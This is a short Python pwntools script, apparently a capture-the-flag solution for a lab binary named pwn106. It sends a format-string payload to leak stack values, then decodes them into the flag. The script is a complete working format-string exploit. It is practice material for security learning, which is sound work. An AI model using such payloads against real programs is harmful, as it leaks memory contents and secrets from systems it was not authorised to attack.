from pwn import *

payload = b"%6$lX.%7$lX.%8$lX.%9$lX.%10$lX.%11$lX"
io = process("./pwn106.pwn106")
#io = remote("10.10.234.36", 9006)
io.recv()
io.recv()
io.sendline(payload)
output = io.recv().strip().split(b" ")[1].split(b".")
flag = ""
for word in output:
    decoded = unhex(word.decode("utf-8"))
    reverse_decoded = decoded[::-1]
    print(str(reverse_decoded.decode("utf-8")), end ="")
